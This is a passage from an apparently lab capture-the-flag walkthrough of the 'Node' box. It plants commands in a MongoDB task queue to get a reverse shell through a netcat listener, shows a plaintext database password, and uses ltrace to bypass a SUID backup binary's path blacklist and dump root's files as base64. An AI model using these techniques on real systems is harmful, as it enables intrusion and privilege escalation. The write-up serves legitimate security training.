</span></span><span class=line><span class=cl>syslog    <span class=m>1075</span>  0.0  0.4 <span class=m>256400</span>  <span class=m>3384</span> ?        Ssl  22:30   0:00 /usr/sbin/rsyslogd -n
</span></span><span class=line><span class=cl>root      <span class=m>1076</span>  0.0  0.1   <span class=m>4400</span>  <span class=m>1264</span> ?        Ss   22:30   0:00 /usr/sbin/acpid
</span></span><span class=line><span class=cl>root      <span class=m>1080</span>  0.0  0.4  <span class=m>28548</span>  <span class=m>3088</span> ?        Ss   22:30   0:00 /lib/systemd/systemd-logind
</span></span><span class=line><span class=cl>root      <span class=m>1088</span>  0.0  0.8 <span class=m>275892</span>  <span class=m>6168</span> ?        Ssl  22:30   0:00 /usr/lib/accountsservice/accounts-daem
</span></span><span class=line><span class=cl>root      <span class=m>1093</span>  0.5  1.3 <span class=m>192268</span> <span class=m>10200</span> ?        Ssl  22:30   0:00 /usr/bin/vmtoolsd
</span></span><span class=line><span class=cl>message+  <span class=m>1100</span>  0.0  0.5  <span class=m>42904</span>  <span class=m>3792</span> ?        Ss   22:30   0:00 /usr/bin/dbus-daemon --system --addres
</span></span><span class=line><span class=cl>root      <span class=m>1111</span>  0.0  0.1  <span class=m>95368</span>  <span class=m>1388</span> ?        Ssl  22:30   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
</span></span><span class=line><span class=cl>daemon    <span class=m>1113</span>  0.0  0.2  <span class=m>26044</span>  <span class=m>2192</span> ?        Ss   22:30   0:00 /usr/sbin/atd -f
</span></span><span class=line><span class=cl>root      <span class=m>1118</span>  0.0  2.7 <span class=m>193596</span> <span class=m>21164</span> ?        S&lt;sl 22:30   0:00 /usr/lib/snapd/snapd
</span></span><span class=line><span class=cl>root      <span class=m>1141</span>  0.0  0.0  <span class=m>13376</span>   <span class=m>168</span> ?        Ss   22:30   0:00 /sbin/mdadm --monitor --pid-file /run/
</span></span><span class=line><span class=cl>root      <span class=m>1145</span>  0.0  0.7 <span class=m>277180</span>  <span class=m>6056</span> ?        Ssl  22:30   0:00 /usr/lib/policykit-1/polkitd --no-debu
</span></span><span class=line><span class=cl>mongodb   <span class=m>1231</span>  0.9 11.4 <span class=m>278880</span> <span class=m>87072</span> ?        Ssl  22:30   0:00 /usr/bin/mongod --auth --quiet --confi
</span></span><span class=line><span class=cl>tom       <span class=m>1234</span>  0.5  5.2 <span class=m>1007544</span> <span class=m>39528</span> ?       Ssl  22:30   0:00 /usr/bin/node /var/scheduler/app.js
</span></span><span class=line><span class=cl>tom       <span class=m>1236</span>  0.7  5.3 <span class=m>1019880</span> <span class=m>40344</span> ?       Ssl  22:30   0:00 /usr/bin/node /var/www/myplace/app.js
</span></span><span class=line><span class=cl>root      <span class=m>1240</span>  0.0  0.7  <span class=m>65520</span>  <span class=m>5548</span> ?        Ss   22:30   0:00 /usr/sbin/sshd -D
</span></span><span class=line><span class=cl>root      <span class=m>1501</span>  0.0  0.9  <span class=m>95404</span>  <span class=m>6956</span> ?        Ss   22:31   0:00  <span class=se>\_</span> sshd: mark <span class=o>[</span>priv<span class=o>]</span>
</span></span><span class=line><span class=cl>mark      <span class=m>1514</span>  0.0  0.4  <span class=m>95404</span>  <span class=m>3256</span> ?        S    22:32   0:00      <span class=se>\_</span> sshd: mark@pts/0
</span></span><span class=line><span class=cl>mark      <span class=m>1515</span>  0.3  0.6  <span class=m>19608</span>  <span class=m>4756</span> pts/0    Ss   22:32   0:00          <span class=se>\_</span> -bash
</span></span><span class=line><span class=cl>mark      <span class=m>1530</span>  0.0  0.4  <span class=m>34724</span>  <span class=m>3176</span> pts/0    R+   22:32   0:00              <span class=se>\_</span> ps -faux
</span></span><span class=line><span class=cl>root      <span class=m>1257</span>  0.0  0.0   <span class=m>5224</span>   <span class=m>156</span> ?        Ss   22:30   0:00 /sbin/iscsid
</span></span><span class=line><span class=cl>root      <span class=m>1258</span>  0.0  0.4   <span class=m>5724</span>  <span class=m>3520</span> ?        S&lt;Ls 22:30   0:00 /sbin/iscsid
</span></span><span class=line><span class=cl>root      <span class=m>1317</span>  0.0  0.2  <span class=m>15940</span>  <span class=m>1804</span> tty1     Ss+  22:30   0:00 /sbin/agetty --noclear tty1 linux
</span></span><span class=line><span class=cl>mark      <span class=m>1504</span>  0.0  0.6  <span class=m>45248</span>  <span class=m>4572</span> ?        Ss   22:32   0:00 /lib/systemd/systemd --user
</span></span><span class=line><span class=cl>mark      <span class=m>1506</span>  0.0  0.2  <span class=m>61344</span>  <span class=m>2068</span> ?        S    22:32   0:00  <span class=se>\_</span> <span class=o>(</span>sd-pam<span class=o>)</span>
</span></span></code></pre></div><p>We can see a mongoDB running and that node.js is executing two processes the webserver located at <code>/var/www/myplace</code> and other one located at <code>/VAR/scheduler</code></p><p>Navigating to <code>/var/www/myplace</code> we can see that is the same folder as the backup so let’s focus on <code>/var/scheduler</code> we have other app.js</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=kr>const</span> <span class=nx>exec</span>        <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;child_process&#39;</span><span class=p>).</span><span class=nx>exec</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>MongoClient</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;mongodb&#39;</span><span class=p>).</span><span class=nx>MongoClient</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>ObjectID</span>    <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;mongodb&#39;</span><span class=p>).</span><span class=nx>ObjectID</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>url</span>         <span class=o>=</span> <span class=s1>&#39;mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&amp;authSource=scheduler&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>MongoClient</span><span class=p>.</span><span class=nx>connect</span><span class=p>(</span><span class=nx>url</span><span class=p>,</span> <span class=kd>function</span><span class=p>(</span><span class=nx>error</span><span class=p>,</span> <span class=nx>db</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nx>error</span> <span class=o>||</span> <span class=o>!</span><span class=nx>db</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s1>&#39;[!] Failed to connect to mongodb&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nx>setInterval</span><span class=p>(</span><span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>db</span><span class=p>.</span><span class=nx>collection</span><span class=p>(</span><span class=s1>&#39;tasks&#39;</span><span class=p>).</span><span class=nx>find</span><span class=p>().</span><span class=nx>toArray</span><span class=p>(</span><span class=kd>function</span> <span class=p>(</span><span class=nx>error</span><span class=p>,</span> <span class=nx>docs</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>error</span> <span class=o>&amp;&amp;</span> <span class=nx>docs</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>docs</span><span class=p>.</span><span class=nx>forEach</span><span class=p>(</span><span class=kd>function</span> <span class=p>(</span><span class=nx>doc</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=k>if</span> <span class=p>(</span><span class=nx>doc</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s1>&#39;Executing task &#39;</span> <span class=o>+</span> <span class=nx>doc</span><span class=p>.</span><span class=nx>_id</span> <span class=o>+</span> <span class=s1>&#39;...&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nx>exec</span><span class=p>(</span><span class=nx>doc</span><span class=p>.</span><span class=nx>cmd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nx>db</span><span class=p>.</span><span class=nx>collection</span><span class=p>(</span><span class=s1>&#39;tasks&#39;</span><span class=p>).</span><span class=nx>deleteOne</span><span class=p>({</span> <span class=nx>_id</span><span class=o>:</span> <span class=k>new</span> <span class=nx>ObjectID</span><span class=p>(</span><span class=nx>doc</span><span class=p>.</span><span class=nx>_id</span><span class=p>)</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>          <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>});</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nx>error</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s1>&#39;Something went wrong: &#39;</span> <span class=o>+</span> <span class=nx>error</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>});</span>
</span></span><span class=line><span class=cl>  <span class=p>},</span> <span class=mi>30000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span></code></pre></div><p>It’s pretty similar as the first one but does different stuff, we can observe that the code execute the command allocated at cmd which is on the tasks collection of the scheduler database.</p><p>Let’s try to connect to mongoDB and see who is executing that commands.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mongo -u mark -p 5AYRft73VtFpc84k scheduler
</span></span></code></pre></div><p>Once in we can list the collections to assure that tasks really exists on the database.</p><p><img alt=/HTB/node-16.png loading=lazy src=/HTB/node-16.png></p><p>Now let’s insert the command at cmd. First, I am going to put the following command.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=nx>touch</span> <span class=o>/</span><span class=nx>tmp</span><span class=o>/</span><span class=nx>test</span>
</span></span></code></pre></div><p><img alt=/HTB/node-17.png loading=lazy src=/HTB/node-17.png></p><p>If all goes well the command should be executed, this command create a file at tmp directory called test which leaks who has executed the command.</p><p><img alt=/HTB/node-18.png loading=lazy src=/HTB/node-18.png></p><p>The owner is tomas, so let’s change the command and try to insert an one line reverse shell. Before inserting the command we need to put a nc listener.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=nx>nc</span> <span class=o>-</span><span class=nx>lv</span> <span class=mi>4444</span>
</span></span></code></pre></div><p><img alt=/HTB/node-19.png loading=lazy src=/HTB/node-19.png></p><p><img alt=/HTB/node-20.png loading=lazy src=/HTB/node-20.png></p><p>We are logged as tomas.</p><p>As always we need to do the tty treatment, the objective of this write up is not to teach how to do it so I am going to skip this step.</p><p>Now let’s cat the <strong>user’s flag</strong>.</p><p><img alt=/HTB/node-21.png loading=lazy src=/HTB/node-21.png></p><p>Perfect only rests to know how works the backup SUID binary. ltrace can gives us more info of what is happening at background.</p><p>The binary doesn’t seems to have -h flag.</p><p>First I try to run it without ltrace and without any args but nothing happened.</p><p>With args shows some stuff but is pretty irrelevant.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>__libc_start_main<span class=o>(</span>0x80489fd, 3, 0xfffa6ee4, 0x80492c0 &lt;unfinished ...&gt;
</span></span><span class=line><span class=cl>geteuid<span class=o>()</span>                                        <span class=o>=</span> <span class=m>1000</span>
</span></span><span class=line><span class=cl>setuid<span class=o>(</span>1000<span class=o>)</span>                                     <span class=o>=</span> <span class=m>0</span>
</span></span><span class=line><span class=cl>exit<span class=o>(</span><span class=m>1</span> &lt;no <span class=k>return</span> ...&gt;
</span></span><span class=line><span class=cl>+++ exited <span class=o>(</span>status 1<span class=o>)</span> +++
</span></span></code></pre></div><p>After that I start with one argument and increased the number of argument to one in each try until I get a different response.</p><p>With three arguments I receive the following response.</p><p><img alt=/HTB/node-22.png loading=lazy src=/HTB/node-22.png></p><p>We have now how much arguments is required to execute the command now let’s figure what we need to put in this arguments.</p><p>Let’s run it again but this time with ltrace</p><p>Checking the first lines of the output we can observe a comparison.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>strcmp<span class=o>(</span><span class=s2>&#34;a&#34;</span>, <span class=s2>&#34;-q&#34;</span><span class=o>)</span>                                <span class=o>=</span> <span class=m>1</span>
</span></span></code></pre></div><p>So we know that in the first arguments we need to put the -q flag (Is not required at all because refers to the quiet mode).</p><p>If we continue reading the output of ltrace we can see a lines where the second argument is compared with strings taken from a keys file located on <code>/etc/myplace/keys</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>fopen<span class=o>(</span><span class=s2>&#34;/etc/myplace/keys&#34;</span>, <span class=s2>&#34;r&#34;</span><span class=o>)</span>                  <span class=o>=</span> 0x8a4e410
</span></span><span class=line><span class=cl>fgets<span class=o>(</span><span class=s2>&#34;a01a6aa5aaf1d7729f35c8278daae30f&#34;</span>..., 1000, 0x8a4e410<span class=o>)</span> <span class=o>=</span> 0xff84b77f
</span></span><span class=line><span class=cl>strcspn<span class=o>(</span><span class=s2>&#34;a01a6aa5aaf1d7729f35c8278daae30f&#34;</span>..., <span class=s2>&#34;\n&#34;</span><span class=o>)</span> <span class=o>=</span> <span class=m>64</span>
</span></span><span class=line><span class=cl>strcmp<span class=o>(</span><span class=s2>&#34;a&#34;</span>, <span class=s2>&#34;a01a6aa5aaf1d7729f35c8278daae30f&#34;</span>...<span class=o>)</span> <span class=o>=</span> -1
</span></span><span class=line><span class=cl>fgets<span class=o>(</span><span class=s2>&#34;45fac180e9eee72f4fd2d9386ea7033e&#34;</span>..., 1000, 0x8a4e410<span class=o>)</span> <span class=o>=</span> 0xff84b77f
</span></span><span class=line><span class=cl>strcspn<span class=o>(</span><span class=s2>&#34;45fac180e9eee72f4fd2d9386ea7033e&#34;</span>..., <span class=s2>&#34;\n&#34;</span><span class=o>)</span> <span class=o>=</span> <span class=m>64</span>
</span></span><span class=line><span class=cl>strcmp<span class=o>(</span><span class=s2>&#34;a&#34;</span>, <span class=s2>&#34;45fac180e9eee72f4fd2d9386ea7033e&#34;</span>...<span class=o>)</span> <span class=o>=</span> <span class=m>1</span>
</span></span><span class=line><span class=cl>fgets<span class=o>(</span><span class=s2>&#34;3de811f4ab2b7543eaf45df611c2dd25&#34;</span>..., 1000, 0x8a4e410<span class=o>)</span> <span class=o>=</span> 0xff84b77f
</span></span><span class=line><span class=cl>strcspn<span class=o>(</span><span class=s2>&#34;3de811f4ab2b7543eaf45df611c2dd25&#34;</span>..., <span class=s2>&#34;\n&#34;</span><span class=o>)</span> <span class=o>=</span> <span class=m>64</span>
</span></span><span class=line><span class=cl>strcmp<span class=o>(</span><span class=s2>&#34;a&#34;</span>, <span class=s2>&#34;3de811f4ab2b7543eaf45df611c2dd25&#34;</span>...<span class=o>)</span> <span class=o>=</span> <span class=m>1</span>
</span></span><span class=line><span class=cl>fgets<span class=o>(</span><span class=s2>&#34;\n&#34;</span>, 1000, 0x8a4e410<span class=o>)</span>                     <span class=o>=</span> 0xff84b77f
</span></span></code></pre></div><p>Now we know that the second argument requires a key (I choosed the first one).</p><p>Nothing is outputted for the third argument so let’s put the info which we gathered and still putting a random argument for the third one and see what outputs ltrace.</p><p>Once executed ltrace throws more info</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>strstr<span class=o>(</span><span class=s2>&#34;a&#34;</span>, <span class=s2>&#34;..&#34;</span><span class=o>)</span>                                                                                                                <span class=o>=</span> nil
</span></span><span class=line><span class=cl>strstr<span class=o>(</span><span class=s2>&#34;a&#34;</span>, <span class=s2>&#34;/root&#34;</span><span class=o>)</span>                                                                                                             <span class=o>=</span> nil
</span></span><span class=line><span class=cl>strchr<span class=o>(</span><span class=s2>&#34;a&#34;</span>, <span class=s1>&#39;;&#39;</span><span class=o>)</span>                                                                                                                 <span class=o>=</span> nil
</span></span><span class=line><span class=cl>strchr<span class=o>(</span><span class=s2>&#34;a&#34;</span>, <span class=s1>&#39;&amp;&#39;</span><span class=o>)</span>                                                                                                                 <span class=o>=</span> nil
</span></span><span class=line><span class=cl>strchr<span class=o>(</span><span class=s2>&#34;a&#34;</span>, <span class=s1>&#39;`&#39;</span><span class=o>)</span>                                                                                                                 <span class=o>=</span> nil
</span></span><span class=line><span class=cl>strchr<span class=o>(</span><span class=s2>&#34;a&#34;</span>, <span class=s1>&#39;$&#39;</span><span class=o>)</span>                                                                                                                 <span class=o>=</span> nil
</span></span><span class=line><span class=cl>strchr<span class=o>(</span><span class=s2>&#34;a&#34;</span>, <span class=s1>&#39;|&#39;</span><span class=o>)</span>                                                                                                                 <span class=o>=</span> nil
</span></span><span class=line><span class=cl>strstr<span class=o>(</span><span class=s2>&#34;a&#34;</span>, <span class=s2>&#34;//&#34;</span><span class=o>)</span>                                                                                                                <span class=o>=</span> nil
</span></span><span class=line><span class=cl>strcmp<span class=o>(</span><span class=s2>&#34;a&#34;</span>, <span class=s2>&#34;/&#34;</span><span class=o>)</span>                                                                                                                 <span class=o>=</span> <span class=m>1</span>
</span></span><span class=line><span class=cl>strstr<span class=o>(</span><span class=s2>&#34;a&#34;</span>, <span class=s2>&#34;/etc&#34;</span><span class=o>)</span>                                                                                                              <span class=o>=</span> nil
</span></span><span class=line><span class=cl>strcpy<span class=o>(</span>0xff96e6db, <span class=s2>&#34;a&#34;</span><span class=o>)</span>                                                                                                          <span class=o>=</span> 0xff96e6db
</span></span><span class=line><span class=cl>getpid<span class=o>()</span>                                                                                                                         <span class=o>=</span> <span class=m>1616</span>
</span></span><span class=line><span class=cl>time<span class=o>(</span>0<span class=o>)</span>                                                                                                                          <span class=o>=</span> <span class=m>1692657131</span>
</span></span><span class=line><span class=cl>clock<span class=o>(</span>0, 0, 0, 0<span class=o>)</span>                                                                                                                <span class=o>=</span> <span class=m>2197</span>
</span></span><span class=line><span class=cl>srand<span class=o>(</span>0x6be79211, 0xc66d38c7, 0x6be79211, 0x804918c<span class=o>)</span>                                                                             <span class=o>=</span> <span class=m>0</span>
</span></span><span class=line><span class=cl>rand<span class=o>(</span>0, 0, 0, 0<span class=o>)</span>                                                                                                                 <span class=o>=</span> 0x24e99f77
</span></span><span class=line><span class=cl>sprintf<span class=o>(</span><span class=s2>&#34;/tmp/.backup_619290487&#34;</span>, <span class=s2>&#34;/tmp/.backup_%i&#34;</span>, 619290487<span class=o>)</span>                                                                  <span class=o>=</span> <span class=m>22</span>
</span></span><span class=line><span class=cl>sprintf<span class=o>(</span><span class=s2>&#34;/usr/bin/zip -r -P magicword /tm&#34;</span>..., <span class=s2>&#34;/usr/bin/zip -r -P magicword %s &#34;</span>..., <span class=s2>&#34;/tmp/.backup_619290487&#34;</span>, <span class=s2>&#34;a&#34;</span><span class=o>)</span>             <span class=o>=</span> <span class=m>65</span>
</span></span><span class=line><span class=cl>system<span class=o>(</span><span class=s2>&#34;/usr/bin/zip -r -P magicword /tm&#34;</span>... &lt;no <span class=k>return</span> ...&gt;
</span></span></code></pre></div><p>The binary is comparing the third argument with existing directories and then zips the directory with the same password which we have used before with the web backup. Thanks to that I realized that maybe is the tool which uses the webpage to perform the backups.</p><p>One thing we can do is do a backup of the root’s directory, as it is a SUID binary it will allow us to compress such directory without problem. I perform the following command.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>backup -q a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 /root
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA<span class=o>==</span>
</span></span></code></pre></div><p>We receive a base64 encoded output so suggests the same procedure as before.</p><p>Once unzipped the file we have only have one file with the following flag.</p><p><img alt=/HTB/node-23.png loading=lazy src=/HTB/node-23.png></p><p>I am not a expert but doesn’t seems a flag xD.</p><p>Maybe the binary is doing any type of comparison to exclude some directories for being zipped like a kind of blacklist. If we take a look again on the above code we can see that is comparing the argument with <code>/root</code> so maybe is not contemplating <code>root</code> argument without the slash.</p><p>So If we move to the <code>/</code> directory and try the following command we are skipping the blacklist check.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>backup -q a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 root
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>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